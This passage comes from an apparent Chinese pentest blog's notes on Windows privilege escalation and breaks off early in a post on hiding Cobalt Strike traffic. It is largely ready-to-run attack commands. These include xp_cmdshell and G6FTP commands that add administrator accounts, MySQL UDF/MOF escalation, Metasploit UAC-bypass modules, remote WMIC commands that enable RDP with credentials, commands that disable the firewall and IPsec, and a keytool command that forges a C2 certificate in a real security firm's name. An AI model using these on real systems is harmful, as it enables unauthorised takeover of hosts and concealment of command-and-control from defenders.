dll 劫持提权"></a>本地 dll 劫持提权</h2><h3 id="漏洞简介-2"><a href="#漏洞简介-2" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Windows 程序启动的时候需要 DLL。如果这些 DLL 不存在，则可以通过在应用程序要查找的位置放置恶意 DLL 来提权。通常，Windows 应用程序有其预定义好的搜索 DLL 的路径，它会根据下面的顺序进行搜索：</p><p>1、应用程序加载的目录<br>2、C:\Windows\System32<br>3、C:\Windows\System<br>4、C:\Windows<br>5、当前工作目录 Current Working Directory，CWD<br>6、在 PATH 环境变量的目录（先系统后用户）</p><p>这样的加载顺序很容易导致一个系统 dll 被劫持，因为只要攻击者将目标文件和恶意 dll 放在一起即可，导致恶意 dll 先于系统 dll 加载，而系统 dll 是非常常见的，所以当时基于这样的加载顺序，出现了大量受影响软件</p><h3 id="漏洞复现-7"><a href="#漏洞复现-7" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>程序运行一般会加载系统 dll 或本身程序自带的 dll，如果我们将程序执行时需要加载的 dll 文件替换成木马程序，那么我们下次在启动程序时所加载的 dll 就是我们替换的那个木马程序了。</p><p>攻击过程：收集进程加载的 dll - 制作 dll 木马并上传 - 替换 dll - 启动应用后成功加载恶意 dll</p><p>1、收集进程加载的 dll<br>使用火绒剑分析该进程执行时加载了哪些 dll</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634113570/Xnip2021-10-13_16-25-17_gcsdc3.png"></p><p>系统文件一般我们是更改不了的，所以一般选择未知文件和数字签名文件</p><p>将它加载的 dll 文件替换为恶意 dll 文件即可</p><h2 id="第三方服务提权"><a href="#第三方服务提权" class="headerlink" title="第三方服务提权"></a>第三方服务提权</h2><p>除了系统自带的服务外 ，安装第三方的软件例如 mysql sqlserver ftp 等应用软件，如果权限设置不对，会对服务器造成安全隐患，从而导致服务器被提权。</p><h3 id="SQL-SERVER-提权"><a href="#SQL-SERVER-提权" class="headerlink" title="SQL SERVER 提权"></a>SQL SERVER 提权</h3><h4 id="漏洞介绍-2"><a href="#漏洞介绍-2" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>如果网站里面使用的数据库是 sqlserver 那么如果找到 sa 的密码，利用提权脚本，执行命令，但是不一定是系统权限，还要看管理员开始安装 sqlserver 的权限设置，一般情况是 system 权限或者 pulic 均能执行命令</p><p>敏感文件</p><p>web.config<br>config.asp<br>conn.aspx<br>database.aspx</p><h4 id="漏洞复现-8"><a href="#漏洞复现-8" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>使用 mssql 连接工具、sqltools 或者 webshell net 提权脚本输入账号和密码连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Exec sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE;exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;RECONFIGURE;</span><br><span class="line">Exec master.dbo.xp_cmdshell &#x27;net user lx 123456 /add &amp; net localgroupadministrators lx /add&#x27; //添加用户并加入管理组</span><br><span class="line">Exec master.dbo.xp_cmdshell &#x27;systeminfo&#x27;  //系统信息</span><br></pre></td></tr></table></figure><h3 id="mysql-提权"><a href="#mysql-提权" class="headerlink" title="mysql 提权"></a>mysql 提权</h3><h4 id="udf-提权"><a href="#udf-提权" class="headerlink" title="udf 提权"></a>udf 提权</h4><h4 id="漏洞简介-3"><a href="#漏洞简介-3" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>在 mysql 可以使用自定义函数进行提权，udf &#x3D; user defined function 用户自定义函数对于自定义的函数 在 mysql5.1 版本以后就需要放在插件插件目录 &#x2F;lib&#x2F;plugin , 文件后缀 dll，c 语言编写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%plugin%&quot; #查询插件目录</span><br></pre></td></tr></table></figure><h4 id="漏洞复现-9"><a href="#漏洞复现-9" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>寻找 mysql 服务的连接账号和密码、一般存在于网站配置文件中</p><p>使用 exp 创建一个 udf 函数执行命令即可</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634116416/Xnip2021-10-13_17-13-23_vhzf28.png"></p><h4 id="mysql-提权问题"><a href="#mysql-提权问题" class="headerlink" title="mysql 提权问题"></a>mysql 提权问题</h4><p>1、版本有 32 和 64 位的 mysql 创建函数的方法一样，但是 64 版本的要用 64 的 udf.dll</p><p>2、报错 The MySQL server is running with the –secure-file-priv option so it cannot execute this statement 这种是 mysql 默认设置是不允许导入导出 需要在 my.ini 添加 secure-file-priv &#x3D; 保存重启 mysql 即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@global.secure_file_priv  #查询导入导出配置</span><br></pre></td></tr></table></figure><p>3、Can’t create&#x2F;write to file ‘D:\phpStudy\MySQL\lib\plugin\udf.dll 这种是没有权限导出或者 plugin 目录不存在，需要手动创建或者权限不够。</p><h4 id="mof-提权"><a href="#mof-提权" class="headerlink" title="mof 提权"></a>mof 提权</h4><p>托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。在 MOF 文件中创建类实例和类定义后，可以对该文件进行编译。编译 MOF 文件将在 CIM 储存库中注册所有的类定义和实例。之后，提供程序、事件类别和事件信息，便可由 WMI 和 Visual Studio Analyzer 使用。 在 MOF 文件中创建提供程序、事件类别和事件类的实例，并且定义想要分析的自定义对象，之后，就可以对该文件进行编译。</p><h4 id="漏洞简介-4"><a href="#漏洞简介-4" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>mof 是 windows 系统的一个文件（在 c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof）叫做” 托管对象格式” 其作用是每隔五秒就会去监控进程创建和死亡。其实就是用有了 mysql 的 root 权限了以后，然后使用 root 权限去执行我们上传的 mof。隔了一定时间以后这个 mof 就会被执行，这个 mof 当中有一段是 vbs 脚本，这个 vbs 大多数的是 cmd 的添加管理员用户的命令。</p><h4 id="漏洞影响版本-1"><a href="#漏洞影响版本-1" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h4><p>windows 03 及以下版本</p><p>需要满足以下条件</p><p>1、mysql 启动身份具有权限去读写 c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof 目录<br>2、secure-file-priv 参数不为 null</p><p>利用网上现成的 payload 利用即可</p><h3 id="G6FTP-提权"><a href="#G6FTP-提权" class="headerlink" title="G6FTP 提权"></a>G6FTP 提权</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>G6 FTP Server 新一代的 FTP 服务器端软件，支持 RFC-959 标准并增强其中的某些功能，上传和下载都可以续传，实时查看运行状态，占用带宽，还有很多功能。</p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>G6FTP 的默认端口为 8021，只侦听在 127.0.0.1 的 8021 端口上，所以无法从外部直接访问，需要进行端口转发（使用 lcx 工具（lcx 具有三个功能：监听、转发、端口转向））。</p><h4 id="漏洞复现-10"><a href="#漏洞复现-10" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files (x86)\Gene6 FTP Server\RemoteAdmin\Remote.ini  #寻找G6FTP配置文件 cmd5解密码</span><br></pre></td></tr></table></figure><p>使用 lcx 工具将 8021 转发到其它端口之后使用 G6FTP 客户端连接 把所有权限打勾、将自己权限提升到最高</p><p>将以下添加管理员命令设置为 G6FTP SET 命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user test QWEasd123 /add &amp;&amp; net localgroup administrators test /add</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634118007/Xnip2021-10-13_17-39-53_raj22b.png"></p><p>登录 ftp 执行 quote stie A 即可</p><p>写到启动项执行后门</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp://192.168.0.108/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start%</span><br><span class="line">20Menu/Programs/Startup/</span><br></pre></td></tr></table></figure><h2 id="uac-bypass"><a href="#uac-bypass" class="headerlink" title="uac bypass"></a>uac bypass</h2><h3 id="漏洞简介-5"><a href="#漏洞简介-5" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>UAC（UserAccount Control，用户账户控制）简言之就是在 Vista 及更高版本中通过弹框进一步让用户确认是否授权当前可执行文件来达到阻止恶意程序的目的。</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634603300/Xnip2021-10-19_08-27-58_fxmgx9.png"></p><h3 id="漏洞复现-11"><a href="#漏洞复现-11" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>使用 bypassuac 模块一般是可以绕过的 但是也不排除失败的可能 msf 和 cs 均有对应的模块可以一键利用</p><p>原理就是通过进程注入使用可信任发布者证书绕过 Windows UAC</p><p>msf 模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/local/bypassuac</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/local/bypassuac_injection #此模块成功率更高</span><br><span class="line">此模块将利用受信任的通过进程注入发布者证书。它将产生一个关闭UAC标志的第二个shell。此模块使用反射DLL注入技术，仅丢弃DLL有效负载二进制文件，而不是标准技术中的三个单独的二进制文件。但是，它需要选择正确的体系结构x64（也适用于SYSWOW64系统）。如果指定EXE:：自定义DLL应在单独启动有效负载后调用ExitProcess（）</span><br></pre></td></tr></table></figure><h2 id="LCX-端口转发"><a href="#LCX-端口转发" class="headerlink" title="LCX 端口转发"></a>LCX 端口转发</h2><h3 id="工具简介"><a href="#工具简介" class="headerlink" title="工具简介"></a>工具简介</h3><p>lcx 是一款强大的内网端口转发工具，用于将内网主机开放的内部端口映射到外网主机（有公网 IP）任意端口。它是一款命令行工具，当然也可以在有权限的 webshell 下执行，正因如此 lcx 常被认为是一款黑客入侵工具，lcx 在内网入侵渗透中起着重要的角色。lcx 进行端口转发的原理就是使不同端口之间形成一个回路。它常用于外网连接内网 3389 端口</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[option:]</span><br><span class="line">-listen &lt;ConnectPort&gt; &lt;TransmitPort&gt;</span><br><span class="line">-tran &lt;ConnectPort&gt; &lt;TransmitHost&gt; &lt;TransmitPort&gt;</span><br><span class="line">-slave &lt;ConnectHost&gt; &lt;ConnectPort&gt; &lt;TransmitHost&gt; &lt;TransmitPort&gt;</span><br></pre></td></tr></table></figure><h3 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h3><p>本地转发主要是把 127.0.0.1: 端口 这个本地端口转发到外部，让外部的客户端允许连接进来</p><h3 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h3><p>远程转发 一般用于外网无法访问内网，内网可以访问外网，由内部发出请求到外网，所以防火墙不会拦截。客户端除了可以在本地访问内网机子，也可以作为中间人，外部机子也能连接客户端到内网服务端</p><h2 id="相关远程终端问题"><a href="#相关远程终端问题" class="headerlink" title="相关远程终端问题"></a>相关远程终端问题</h2><h3 id="注册表开启-3389"><a href="#注册表开启-3389" class="headerlink" title="注册表开启 3389"></a>注册表开启 3389</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo DO ALL IN CMD!</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v</span><br><span class="line">fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal</span><br><span class="line">Server\Wds\rdpwd\Tds\tcp&quot; /v PortNumber /t REG_DWORD /d 3389 /f</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal</span><br><span class="line">Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 3389 /f</span><br></pre></td></tr></table></figure><h3 id="MSF-命令开启-3389"><a href="#MSF-命令开启-3389" class="headerlink" title="MSF 命令开启 3389"></a>MSF 命令开启 3389</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run getgui -e</span><br></pre></td></tr></table></figure><h3 id="一条命令开启-3389"><a href="#一条命令开启-3389" class="headerlink" title="一条命令开启 3389"></a>一条命令开启 3389</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v</span><br><span class="line">fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><h3 id="WMIC-命令开启-3389"><a href="#WMIC-命令开启-3389" class="headerlink" title="WMIC 命令开启 3389"></a>WMIC 命令开启 3389</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#前提条件是确保“Windows Management Instrumentation(Winmgmt)”服务已正常启动</span><br><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure><h3 id="WMIC-开启-3389"><a href="#WMIC-开启-3389" class="headerlink" title="WMIC 开启 3389"></a>WMIC 开启 3389</h3><p>支持系统：Win2k&#x2F;XP&#x2F;Win2k3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.0.103 /user:administrator /password:betasec PATH win32_terminalservicesetting WHERE (__Class!=&quot;&quot;) CALL SetAllowTSConnections 1</span><br></pre></td></tr></table></figure><p>支持系统：Win7&#x2F;Win2k8&#x2F;Win8.1&#x2F;Win10&#x2F;2012&#x2F;2016</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.0.116 /user:administrator /password:betasec RDTOGGLE WHERE</span><br><span class="line">ServerName=&#x27;WIN-TO2CN3V2VPR&#x27; call SetAllowTSConnections 1</span><br><span class="line">wmic /node:192.168.0.116 /user:administrator /password:betasec process call</span><br><span class="line">create &#x27;cmd.exe /c REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal</span><br><span class="line">Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f&#x27;</span><br></pre></td></tr></table></figure><p>注意：其实就是利用 WMIC 远程执行命令的方式来执行 WMIC、REG 等开启 3389 端口的命令。WMIC 远程开启 3389 端口时不能用 % COMPUTERNAME% 环境变量替代远程主机的计算机名。错误：描述 &#x3D; 拒绝访问，这是因为开启了 UAC 用户账户控制，只允许 RID500 管理员执行此操作</p><h3 id="查询是否开启-3389"><a href="#查询是否开启-3389" class="headerlink" title="查询是否开启 3389"></a>查询是否开启 3389</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections</span><br></pre></td></tr></table></figure><h3 id="注册表查询端口号"><a href="#注册表查询端口号" class="headerlink" title="注册表查询端口号"></a>注册表查询端口号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\</span><br><span class="line"></span><br><span class="line">REG query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds&quot; /s</span><br><span class="line"></span><br><span class="line">REG query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDPTcp&quot; /v PortNumber set /a Port=0xd3d</span><br></pre></td></tr></table></figure><h3 id="网络命令查询端口"><a href="#网络命令查询端口" class="headerlink" title="网络命令查询端口"></a>网络命令查询端口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc | findstr &quot;TermService&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr &quot;进程号&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start |find &quot;Remote Desktop Services&quot;</span><br></pre></td></tr></table></figure><h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><p>确定开启了远程终端并且端口没错的情况下 还是连不上目标，目标上的防火墙可能允许，这个时候可以使用 lcx 端口转发，或者使用命令关闭防火墙</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall show allprofile state #查询防火墙状态</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off #关闭防火墙</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net stop &quot;Windows Firewall&quot; #关闭防火墙</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc config sharedaccess start= disabled  #关闭防火墙</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net stop sharedaccess #关闭防火墙</span><br></pre></td></tr></table></figure><h3 id="关闭-IPSEC"><a href="#关闭-IPSEC" class="headerlink" title="关闭 IPSEC"></a>关闭 IPSEC</h3><p>在关闭防火墙时，还是连接不上，可能是 ipsec 做了 ip 策略处理，导致连接失败可以使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net stop &quot;IPsec Policy Agent&quot;</span><br></pre></td></tr></table></figure><h3 id="3389-连接错误解决方法"><a href="#3389-连接错误解决方法" class="headerlink" title="3389 连接错误解决方法"></a>3389 连接错误解决方法</h3><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634604853/Xnip2021-10-19_08-50-30_fib8ti.png"></p><p>可以使用相同版本的终端进行连接 或者使用 xfreerdp 连接会自动加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install freerdp2-x11 #安装</span><br><span class="line">xfreerdp /f /u:administrator /p:123456 /v:192.168.0.118 #使用语法</span><br></pre></td></tr></table></figure><h3 id="加入远程桌面组"><a href="#加入远程桌面组" class="headerlink" title="加入远程桌面组"></a>加入远程桌面组</h3><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634604858/Xnip2021-10-19_08-51-56_rgombo.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup &quot;Remote Desktop Users&quot; username /add</span><br></pre></td></tr></table></figure><h3 id="终端超出最大连接数"><a href="#终端超出最大连接数" class="headerlink" title="终端超出最大连接数"></a>终端超出最大连接数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mstsc /v:ip:3389 /console #使用此命令连接即可</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt Strike 4.4 去除流量特征+批量上线优化</title>
      <link href="/posts/2854784317/"/>
      <url>/posts/2854784317/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="Cobalt-Strike-简介"><a href="#Cobalt-Strike-简介" class="headerlink" title="Cobalt Strike 简介"></a>Cobalt Strike 简介</h2><p>Cobalt Strike 是一款渗透测试神器，常被业界人称为 CS 神器。Cobalt Strike 已经不再使用 MSF 而是作为单独的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。</p><p>Cobalt Strike 集成了端口转发、扫描多模式端口 Listener、Windows exe 程序生成、Windows dll 动态链接库生成、java 程序生成、office 宏代码生成，包括站点克隆获取浏览器的相关信息等。</p><h2 id="Cobalt-Strike-流量混淆"><a href="#Cobalt-Strike-流量混淆" class="headerlink" title="Cobalt Strike 流量混淆"></a>Cobalt Strike 流量混淆</h2><p>默认情况下、没有做流量混淆的 cs 会被防火拦截流量，所以有时候 cs 上线了机器，但是操作却没有任何反应</p><p>cs 流量混淆一般有两种方法</p><p>1、更改 teamserver 里面与 CS 流量相关的内容</p><p>2、利用 Keytool 工具生成新的 store 证书</p><p>修改这里分为三步进行</p><h3 id="修改默认端口，这里我们修改成-12123"><a href="#修改默认端口，这里我们修改成-12123" class="headerlink" title="修改默认端口，这里我们修改成 12123"></a>修改默认端口，这里我们修改成 12123</h3><p>不要问为什么是 12123 手动狗头哈哈哈</p><p>编辑 teamserver 文件，更改 server port 部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim teamserver</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># start the team server.</span><br><span class="line">java -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=12123 -Dcobaltstrike.server_bindto=0.0.0.0 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=Mannix123456 -server -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -classpath ./cobaltstrike.jar server.TeamServer $*</span><br></pre></td></tr></table></figure><h3 id="去除-Cobalt-Strike-证书特征"><a href="#去除-Cobalt-Strike-证书特征" class="headerlink" title="去除 Cobalt Strike 证书特征"></a>去除 Cobalt Strike 证书特征</h3><p><strong>keytool 工具生成证书</strong></p><p>Keytool 是一个 Java 数据证书的管理工具，Keytool 将密钥（key）和证书（certificates）存在一个称为 keystore 的文件中。</p><p>在 keystore 里，包含两种数据：<br>(1) 密钥实体（Key entity）—— 密钥（secret key）又或者是私钥和配对公钥（采用非对称加密）<br>(2) 可信任的证书实体（trusted certificate entries）—— 只包含公钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">keytool用法：</span><br><span class="line">密钥和证书管理工具</span><br><span class="line"></span><br><span class="line">命令:</span><br><span class="line"></span><br><span class="line"> -certreq            生成证书请求</span><br><span class="line"> -changealias        更改条目的别名</span><br><span class="line"> -delete             删除条目</span><br><span class="line"> -exportcert         导出证书</span><br><span class="line"> -genkeypair         生成密钥对</span><br><span class="line"> -genseckey          生成密钥</span><br><span class="line"> -gencert            根据证书请求生成证书</span><br><span class="line"> -importcert         导入证书或证书链</span><br><span class="line"> -importpass         导入口令</span><br><span class="line"> -importkeystore     从其他密钥库导入一个或所有条目</span><br><span class="line"> -keypasswd          更改条目的密钥口令</span><br><span class="line"> -list               列出密钥库中的条目</span><br><span class="line"> -printcert          打印证书内容</span><br><span class="line"> -printcertreq       打印证书请求的内容</span><br><span class="line"> -printcrl           打印 CRL 文件的内容</span><br><span class="line"> -storepasswd        更改密钥库的存储口令</span><br><span class="line"></span><br><span class="line">使用 &quot;keytool -?, -h, or --help&quot; 可输出此帮助消息</span><br><span class="line">使用 &quot;keytool -command_name --help&quot; 可获取 command_name 的用法。</span><br><span class="line">使用 -conf &lt;url&gt; 选项可指定预配置的选项文件。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -list -v -keystore cobaltstrike.store  #查看Cobalt Strike 默认证书</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">密钥库类型: PKCS12</span><br><span class="line">密钥库提供方: SUN</span><br><span class="line"></span><br><span class="line">您的密钥库包含 1 个条目</span><br><span class="line"></span><br><span class="line">别名: cobaltstrike</span><br><span class="line">创建日期: 2021年9月3日</span><br><span class="line">条目类型: PrivateKeyEntry</span><br><span class="line">证书链长度: 1</span><br><span class="line">证书[1]:</span><br><span class="line">所有者: CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, ST=Cyberspace, C=Earth</span><br><span class="line">发布者: CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, ST=Cyberspace, C=Earth</span><br><span class="line">序列号: 446ea26b</span><br><span class="line">生效时间: Fri Sep 03 10:20:52 HKT 2021, 失效时间: Thu Dec 02 10:20:52 HKT 2021</span><br><span class="line">证书指纹:</span><br><span class="line"> SHA1: 19:04:68:28:BB:93:59:FD:48:16:BB:9F:65:E6:E6:27:49:47:BC:15</span><br><span class="line"> SHA256: 23:C8:3B:5A:AD:97:D3:93:29:80:06:B7:5E:81:80:87:E4:50:4A:A1:CA:72:7E:34:8A:F9:03:DC:C2:40:EF:E8</span><br><span class="line">签名算法名称: SHA256withRSA</span><br><span class="line">主体公共密钥算法: 2048 位 RSA 密钥</span><br><span class="line">版本: 3</span><br><span class="line"></span><br><span class="line">扩展:</span><br><span class="line"></span><br><span class="line">#1: ObjectId: 2.5.29.14 Criticality=false</span><br><span class="line">SubjectKeyIdentifier [</span><br><span class="line">KeyIdentifier [</span><br><span class="line">0000: F3 5D FC 71 AA CC 70 D4   71 09 B0 46 E0 9B 3A DB  .].q..p.q..F..:.</span><br><span class="line">0010: CD E3 FB 81                                        ....</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*******************************************</span><br><span class="line">*******************************************</span><br></pre></td></tr></table></figure><p>可以看到默认证书有很明显的 Cobalt Strike 特征</p><p>使用以下命令生成一个新的 store 证书，-alias 和 -dname 可以自由发挥，也可以用其他的来混淆流量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -keystore ./cobaltstrike.store -storepass QAXNB -keypass QAXNB -genkey -keyalg RSA -alias cobaltstrike -dname &quot;CN=www.qianxin.com, OU=北京奇安信科技有限公司, O=运维部, L=北京, S=北京, C=CN&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 